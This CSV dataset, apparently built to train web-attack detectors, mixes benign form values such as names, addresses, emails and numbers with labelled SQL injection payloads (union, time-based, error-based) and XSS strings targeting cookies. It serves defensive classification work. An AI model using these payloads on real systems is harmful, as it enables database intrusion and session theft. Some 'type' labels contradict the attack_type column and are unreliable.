Text,attack_type,Label,type
8304754574363204,norm,0,normal
05701,norm,0,normal
"paratge barnades, 43",norm,0,normal
39664,norm,0,normal
hinojal,norm,0,normal
3244,norm,0,normal
"-3391' union all select 2024,2024--",sqli,1,sql
clinger,norm,0,normal
kindermann@lawn.je,norm,0,normal
37314,norm,0,normal
"general lacy, 122",norm,0,normal
"1"" where 8734=8734;select * from generate_series(7762,7762,case when (7762=1293) then 1 else 0 end) limit 1--",sqli,1,sql
cbdar,norm,0,normal
5255016250924292,norm,0,normal
mcglynn,norm,0,normal
"1')) as ngoo where 8641=8641 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
frieda6,norm,0,normal
"<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",xss,2,xss
"1"") and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
huc55,norm,0,normal
marcos esculta,norm,0,normal
dellinge,norm,0,normal
tr1qu7flo5,norm,0,normal
suzie,norm,0,normal
11690,norm,0,normal
calle carlos arniches 173,norm,0,normal
escalona,norm,0,normal
termmetro,norm,0,normal
-8641%' order by 1--,sqli,1,sql
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1%')) and (select * from (select(sleep(5)))fzno) and (('%'=',sqli,1,sql
-4835))) or (4219=2081)*2081 and (((8536=8536,sqli,1,normal
"1'||(select 'xbwg' where 7518=7518 union all select null,null,null,null,null,null--",sqli,1,sql
8432,norm,0,normal
"<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",xss,2,normal
calle juan de sevilla 102 3c,norm,0,normal
"1"" where 1765=1765 union all select null,null,null,null,null,null#",sqli,1,sql
606,norm,0,normal
modigh,norm,0,normal
saluotto cunill,norm,0,normal
"-3546%"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",sqli,1,sql
"calle las mimosas, 109 5?f",norm,0,normal
8230522127552712,norm,0,normal
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1,sql
berrisfo,norm,0,normal
montrs benazet,norm,0,normal
"vallbona, 72 3?b",norm,0,normal
ostyn.martan@icodea.lu,norm,0,normal
"-6292) union all select 7499,7499,7499,7499,7499,7499,7499--",sqli,1,sql
"1 and 8407=(select count(*) from generate_series(1,5000000))# tqmr",sqli,1,sql
aljuba,norm,0,normal
1') order by 1--,sqli,1,sql
inofensiva,norm,0,normal
"1%');select benchmark(5000000,md5(0x4c4d6142)) and ('%'='",sqli,1,sql
"pinar, el",norm,0,normal
"1%' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and '%'='",sqli,1,normal
"1%') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
alburqueque fraguas,norm,0,normal
f,norm,0,normal
s134a+reo,norm,0,normal
san ambrosio 65 6?h,norm,0,normal
"1') as ezoa where 4915=4915 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
9334,norm,0,normal
lotfaga,norm,0,normal
haddon@hiperbarcelona.tl,norm,0,normal
"avenida blasco ibaez, s/n, 6?d",norm,0,normal
poblete fiuza,norm,0,normal
28413,norm,0,normal
"1%"";waitfor delay '0:0:5' and ""%""=""",sqli,1,sql
hengevel,norm,0,normal
88003603z,norm,0,normal
02005072r,norm,0,normal
roco del valle,norm,0,normal
61621455q,norm,0,normal
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",sqli,1,normal
"-7320"") where 3907=3907 union all select 3907,3907--",sqli,1,sql
serapia,norm,0,normal
lilley@intelethernet.ic,norm,0,normal
farr,norm,0,normal
contrariosa,norm,0,normal
"1')) and make_set(8403=8403,8899) and (('lokx' like 'lokx",sqli,1,normal
"1'||(select 'yhkt' from dual where 7105=7105 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",sqli,1,sql
9437,norm,0,normal
"1"" and elt(1210=1210,sleep(5)) and ""phcl"" like ""phcl",sqli,1,normal
marcano giner,norm,0,normal
zanobia,norm,0,normal
93966067g,norm,0,normal
albery,norm,0,normal
"1)) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
29?em2ti3a,norm,0,normal
1' where 4134=4134 and 1102=6300--,sqli,1,sql
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((8679=8679",sqli,1,sql
tonny,norm,0,normal
09230,norm,0,normal
abbe@natravea.tk,norm,0,normal
f8li48e3,norm,0,normal
"pealara, 87",norm,0,normal
2545,norm,0,normal
8781236153256548,norm,0,normal
ashlin,norm,0,normal
-2039') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
greear@mcgt.jobs,norm,0,normal
4a2ho4a2o,norm,0,normal
"san roman 140, 2e",norm,0,normal
babar4,norm,0,normal
"><script>alert(""vlab"")</script>",xss,2,xss
r-evu4lo,norm,0,normal
viana de duero,norm,0,normal
"c/ marton y gavin, 145, 6?e",norm,0,normal
2190197985147035,norm,0,normal
"can ferragut, 132, 4?e",norm,0,normal
"-5945'))) union all select 4266,4266,4266,4266,4266--",sqli,1,sql
"1') where 8835=8835 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
rio eo 144,norm,0,normal
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",sqli,1,sql
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('xazf'='xazf,sqli,1,sql
-5918') as olzc where 5992=5992 or 4390=9085,sqli,1,normal
">""<img src=""mocha:document.cookie=true;"">",xss,2,sql
"calle vizcaya, 101 10?f",norm,0,normal
jahu,norm,0,normal
5e938rera,norm,0,normal
rosana,norm,0,normal
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,sqli,1,sql
23710,norm,0,normal
re7ango,norm,0,normal
24566,norm,0,normal
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('foop' like 'foop,sqli,1,sql
"1"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""pyfz"" like ""pyfz",sqli,1,sql
queijo pintat,norm,0,normal
celia,norm,0,normal
cartagenero,norm,0,normal
narvate,norm,0,normal
vallclara,norm,0,normal
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('onmp'='onmp",sqli,1,sql
"-1503"" order by 1--",sqli,1,sql
1')) as dqdv where 8126=8126 and 4595=4595#,sqli,1,normal
"girasol, 189,",norm,0,normal
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'cdgm' like 'cdgm",sqli,1,sql
castiglioni@hiperbilbao.nl,norm,0,normal
hi9dra,norm,0,normal
chayle villablanca,norm,0,normal
senderow,norm,0,normal
7428930336953992,norm,0,normal
yamilem,norm,0,normal
1' where 1692=1692;begin dbms_lock.sleep(5); end--,sqli,1,sql
40469,norm,0,normal
"-9347') union all select 3884,3884#",sqli,1,sql
"-6453"")) as hehs where 9363=9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",sqli,1,sql
15256,norm,0,normal
bravat-a,norm,0,normal
"-3952') union all select 6644,6644,6644--",sqli,1,sql
mohar@ropadegolf.gg,norm,0,normal
facendera,norm,0,normal
84871626q,norm,0,normal
le-van-kim@la-sexta-f1.ro,norm,0,normal
1) where 1013=1013 and 5573=9445#,sqli,1,normal
windham,norm,0,normal
recobracin,norm,0,normal
oran,norm,0,normal
8485,norm,0,normal
lug5r,norm,0,normal
1'+(select xruo where 5709=5709 and 7533=7533)+',sqli,1,sql
"c/ san martin s/n,",norm,0,normal
08580,norm,0,normal
39375,norm,0,normal
3675111830638462,norm,0,normal
1'+(select 'dhcv' where 9372=9372;begin dbms_lock.sleep(5); end)+',sqli,1,sql
scot,norm,0,normal
22115972t,norm,0,normal
"1' where 7910=7910;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
martell canasa,norm,0,normal
t3ue31,norm,0,normal
"-5703') or elt(2972=8708,8708)",sqli,1,normal
b3zucar,norm,0,normal
alba,norm,0,normal
"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,sql
"-8487') where 9655=9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",sqli,1,sql
"1%"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"-9526 where 5734=5734 or elt(1032=1032,3623)--",sqli,1,sql
8590730598040371,norm,0,normal
4129,norm,0,normal
"-6007"")) union all select 6019,6019,6019,6019,6019,6019,6019,6019--",sqli,1,sql
santa cristina de valmadrigal,norm,0,normal
gran@fernandosoto.ch,norm,0,normal
-4768'||(select 'dded' from dual where 6499=6499 union all select 6499--,sqli,1,sql
pi,norm,0,normal
kepinska@manuelpaloma.asia,norm,0,normal
"1 or 8466=benchmark(5000000,md5(0x694a4745))-- rlas",sqli,1,sql
">""&<script>document.cookie=true;</script>",xss,2,xss
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
5303,norm,0,normal
18659,norm,0,normal
6733674859620328,norm,0,normal
1)) as uvep where 6016=6016 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
iamele pedrouzo,norm,0,normal
etchieso,norm,0,normal
mola guell,norm,0,normal
asshole,norm,0,normal
nery,norm,0,normal
tinajas,norm,0,normal
traspilla*r,norm,0,normal
82452687x,norm,0,normal
tetona,norm,0,normal
kirbie,norm,0,normal
"1%')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1%')) and 7989=3457,sqli,1,normal
chiarell1,norm,0,normal
"1%"") rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",sqli,1,sql
c/ otoo 117 8-h,norm,0,normal
"1) where 1622=1622;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"1"")) as jebl where 3464=3464;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
5636450120440789,norm,0,normal
"c/ historiador manuel salcines 133, 6b",norm,0,normal
renny,norm,0,normal
tortolito,norm,0,normal
">""<img src=&{document.cookie=true;};>",xss,2,sql
3,norm,0,normal
michalowski@lodgeinmadrid.mu,norm,0,normal
"pi y margall 17, 7?f",norm,0,normal
enang.ostar,norm,0,normal
92152955m,norm,0,normal
-3243 or 2266=3583#,sqli,1,normal
1%'))) and 2444=9282#,sqli,1,normal
22728,norm,0,normal
"1 where 9404=9404;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
lombarda otago,norm,0,normal
sedigheh,norm,0,normal
8495937407634836,norm,0,normal
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('cixa' like 'cixa",sqli,1,sql
"1' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"plaza esquivias, 68, 5?g",norm,0,normal
1' where 3188=3188 and 9198=9198--,sqli,1,sql
-7041') where 6307=6307 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
hermanos barral 61,norm,0,normal
15680534p,norm,0,normal
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zcrh'='zcrh",sqli,1,sql
6458307895436648,norm,0,normal
"1"") where 9062=9062;select (case when (8916=1357) then 8916 else 8916*(select 8916 from information_schema.character_sets) end)#",sqli,1,sql
wahlberg8@am-si.np,norm,0,normal
zaragoza,norm,0,normal
1%'));select (case when (5322=6200) then 5322 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
23997242p,norm,0,normal
madrigal del monte,norm,0,normal
bruasewetter.astin6@locuraporno.int,norm,0,normal
1'))) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
1'))) and (5995=9618)*9618 and ((('nagr' like 'nagr,sqli,1,normal
auria,norm,0,normal
fuente de pedro naharro,norm,0,normal
"1))) or 8421=(select count(*) from generate_series(1,5000000)) and (((5340=5340",sqli,1,sql
piedras albas,norm,0,normal
"c/ de las violetas, 104,",norm,0,normal
49820,norm,0,normal
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1931=1931) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)),sqli,1,sql
9904632053725609,norm,0,normal
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('nsji'='nsji",sqli,1,normal
rabulas,norm,0,normal
-7532))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8332=8332,sqli,1,sql
"1"") as pgza where 8756=8756 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1"") as ivkw where 4218=4218 union all select null--",sqli,1,sql
6r_o733300e,norm,0,normal
4ibari8a,norm,0,normal
italo,norm,0,normal
harmnica,norm,0,normal
41217479f,norm,0,normal
confirm(2)>,xss,2,normal
6963,norm,0,normal
"1"") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
versteeg,norm,0,normal
prompt(1);>,xss,2,sql
3792182208428268,norm,0,normal
grandinetti@mariposasentudia.mm,norm,0,normal
av. bayona 127 1?c,norm,0,normal
harkin@escapadajoven.gq,norm,0,normal
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('cdaq' like 'cdaq",sqli,1,sql
3218,norm,0,normal
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='",sqli,1,sql
nathalia,norm,0,normal
hillerman.gallo@muebetuweb.ki,norm,0,normal
27253689t,norm,0,normal
si1ovi3,norm,0,normal
"el hosquillo s/n, 5d",norm,0,normal
"1"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
blasinda,norm,0,normal
"1,(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",sqli,1,sql
"-4072%""))) or 3999=1979",sqli,1,normal
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('hmsu'='hmsu",sqli,1,sql
"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",xss,2,sql
roby,norm,0,normal
parypa,norm,0,normal
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'pbin'='pbin",sqli,1,normal
95001516q,norm,0,normal
ruiloba,norm,0,normal
escobedo santagata,norm,0,normal
43962447v,norm,0,normal
1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+',sqli,1,sql
72219452g,norm,0,normal
1)) as prxq where 4600=4600;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
baquet0,norm,0,normal
"-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup",sqli,1,sql
p57at84o,norm,0,normal
zauhar,norm,0,normal
1466,norm,0,normal
daly@diagnosticoradiologico.jm,norm,0,normal
2680573956820155,norm,0,normal
4676117333611545,norm,0,normal
oposicionist3,norm,0,normal
6629,norm,0,normal
